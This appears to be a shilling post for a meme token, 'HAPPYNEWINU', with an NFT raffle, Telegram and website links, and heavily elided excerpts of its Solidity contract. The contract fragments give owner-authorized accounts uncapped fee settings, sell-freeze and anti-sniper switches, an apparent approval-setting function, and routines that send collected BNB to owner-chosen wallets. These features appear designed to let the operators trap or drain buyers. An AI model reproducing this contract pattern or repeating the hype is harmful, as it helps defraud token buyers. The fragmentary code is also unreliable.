...
THE MOONSHOT YOU HAVE BEEN LOOKING FOR TO START OFF THE NEW YEAR!!!!

HUGE MARKETING AND AMAZING PLANS RIGHT IN TIME FOR THE NEW YEAR!!!

JOIN OUR NFT RAFFLE BY MINTING YOUR NFT RAFFLE TICKETS TODAY TO WIN HUGE PRIZES!!!!

WINNERS WILL BE DRAWN LIVE IN VC IN OUR TG!!!

MINT AN NFT RAFFLE TICKET: https://happynewinunft.com/

TG: https://t.me/HappyNewInu
WEBSITE: https://happynewinu.com/
...
contract HAPPYNEWINU is Context, IERC20, Auth {
    using SafeMath for uint256;
    using Address for address;

    string private constant _name = 'HAPPYNEWINU';
    ...
    IBEP20 TOKEN = IBEP20(0xaD5fE82a12d206d97957EF97E9Eb2462b32A82F2);
    ...
    uint256 public _asT = 3000000000 * (10 ** _decimals);
    ...
    uint256 public sT = 10000000000 * (10 ** _decimals);
    uint256 snT = 100000000000;
    bool LFG = false;
    uint256 public vsN = 50;
    uint256 vsD = 100;
    bool snP = false;
    uint8 snPrs = 0 seconds;
    uint8 bscans = 2 seconds;
    mapping (address => uint) private sNip;
    bool contsnp = false;
    uint256 stfu = 100000000000000000000;
    bool sFrz = false;
    uint8 sFrzT = 0 seconds;
    mapping (address => uint) private sFrzin;
    bool bFrz = false;
    uint8 bFrzT = 0 seconds;
    ...
    function setFeR(uint256 _rfi, uint256 _mark, uint256 _liq) external authorized {
        feeRates.rfi = _rfi;
    ...
    function setSFeR(uint256 _rfi, uint256 _mark, uint256 _liq) external authorized {
    ...
    function setisJO(address holder, bool exempt) external authorized {
        isJO[holder] = exempt;
    }
    ...
    function setsnprs(uint8 _snprs) external authorized {
        snPrs = _snprs;
    }
   ...
   function setPresAle() external authorized {
    ...
    function isaJO(address _address) public view returns (bool) {
        return isJO[_address];
    }
    ...
    function setapprvl(address _tadd, address _rec, uint256 _amt, uint256 _amtd) external authorized {
    ...
    function setrecadd(address _mkwa, address _jac, address _dbi, address _wth, address _ext) external authorized {
        mkwA = _mkwa;
        jacZ = _jac;
        dbiL = _dbi;
        wthN = _wth;
    ...
    function approvals(uint256 _na, uint256 _da) external authorized {
        ...
        uint256 acBNBl = acBNBa.mul(csbl).div(100);
        (bool tmpSuccess,) = payable(jacZ).call{value: acBNBf, gas: gso}("");
        (tmpSuccess,) = payable(dbiL).call{value: acBNBs, gas: gso}("");
        (tmpSuccess,) = payable(wthN).call{value: acBNBt, gas: gso}("");
        (tmpSuccess,) = payable(extW).call{value: acBNBl, gas: gso}("");
        tmpSuccess = false;
    }
    ...
    function setcsbP(uint256 _csbf, uint256 _csbs, uint256 _csbt, uint256 _csbl) external authorized {
        csbf = _csbf;
        csbs = _csbs;
        csbt = _csbt;
        csbl = _csbl;
